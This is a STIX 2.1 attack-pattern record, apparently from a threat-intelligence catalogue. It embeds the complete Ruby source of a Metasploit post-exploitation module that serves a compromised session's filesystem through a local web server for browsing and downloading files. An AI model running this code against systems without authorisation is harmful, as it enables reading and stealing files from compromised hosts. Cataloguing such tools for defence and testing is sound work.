{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bf2f019b-07d0-4f0a-b7b9-ef2f23c90124",
    "created": "2024-08-14T16:33:18.005835Z",
    "modified": "2024-08-14T16:33:18.005838Z",
    "name": "Browse the session filesystem in a Web Browser",
    "description": " This module allows you to browse the session filesystem via a local browser window.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/fileshare.rb",
            "external_id": "fileshare.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'cgi'\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::File\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Browse the session filesystem in a Web Browser',\n        'Description' => %q{\n          This module allows you to browse the session filesystem via a local\n          browser window.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'timwr'],\n        'Platform' => [ 'linux', 'win', 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell', 'powershell' ],\n        'DefaultOptions' => { 'SRVHOST' => '127.0.0.1' },\n        'Notes' => {\n          'Reliability' => [ ],\n          'SideEffects' => [ ],\n          'Stability' => [ CRASH_SAFE ]\n        }\n      )\n    )\n  end\n\n  def run\n    exploit\n  end\n\n  def primer\n    uri = get_uri.chomp('/') + '/'\n    current_dir = pwd\n    if session.platform == 'windows'\n      current_dir = current_dir.gsub('\\\\', '/')\n    end\n    print_status(\"Current directory: #{uri}#{current_dir}\")\n  end\n\n  def list_path(file_path, uripath)\n    contents = []\n    if file_path == '/' && session.platform == 'windows'\n      get_drives.each do |drive|\n        driveurl = drive + ':/'\n        furl = uripath + driveurl\n        contents << [furl, driveurl]\n      end\n      return contents\n    end\n\n    base_url = uripath\n    if file_path.starts_with?('/')\n      base_url = base_url.chomp('/')\n    end\n    base_url += file_path.chomp('/') + '/'\n    dir(file_path).each do |file|\n      next if ['.', '..'].include?(file)\n\n      furl = base_url + file\n      contents << [furl, file]\n    end\n    contents\n  end\n\n  def handle_response(cli, request_uri)\n    uripath = get_resource.chomp('/')\n\n    # Convert http://127.0.0.1/URIPATH/file/ -> /file\n    if request_uri != uripath && request_uri.starts_with?(uripath)\n      file_path = request_uri[uripath.length, request_uri.length].chomp('/')\n    end\n    if file_path.blank?\n      file_path = '/'\n    end\n\n    uripath += '/'\n\n    # Convert /C: -> C:/\n    if session.platform == 'windows'\n      if file_path.starts_with?('/')\n        file_path = file_path[1, file_path.length]\n      end\n      if /([A-Z]):$/ =~ file_path\n        file_path += '/'\n      end\n    end\n    if file_path.blank?\n      file_path = '/'\n    end\n\n    print_status(\"Request uri: #{request_uri} file_path: #{file_path} from #{cli.peerhost}\")\n    root_dir = (file_path == '/')\n\n    if file?(file_path) && !root_dir\n      # Download the file\n      data = read_file(file_path)\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })\n      return\n    elsif directory?(file_path) || root_dir\n      # List the directory\n      body = \"<h2>Directory listing for #{CGI.escapeHTML(file_path)}</h2><hr>\"\n      body << \"<ul>\\n\"\n      unless root_dir\n        basedir = request_uri[0, request_uri.chomp('/').rindex('/')]\n        if basedir.blank?\n          basedir = '/'\n        end\n        body << \"<li><a href=\\\"#{CGI.escapeHTML(basedir)}\\\">..</a>\\n\"\n      end\n      list_path(file_path, uripath).each do |furl, fname|\n        body << \"<li><a href=\\\"#{CGI.escapeHTML(furl)}\\\">#{CGI.escapeHTML(fname)}</a>\\n\"\n      end\n      body << \"</ul>\\n\"\n      html = %(<html>\n  <head>\n  <META HTTP-EQUIV=\"PRAGMA\" CONTENT=\"NO-CACHE\">\n  <META HTTP-EQUIV=\"CACHE-CONTROL\" CONTENT=\"NO-CACHE\">\n  <title>Metasploit File Sharing</title>\n  </head>\n  <body>\n  #{body}\n  </body>\n  </style>\n  </html>\n      )\n      send_response(cli, html, { 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })\n    else\n      send_not_found(cli)\n    end\n  end\n\n  def on_request_uri(cli, request)\n    handle_response(cli, request.uri)\n  rescue ::Rex::Post::Meterpreter::RequestError\n    cli.send_response(create_response(500, 'Unknown error'))\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'linux', 'win', 'osx' ]"
    ]
}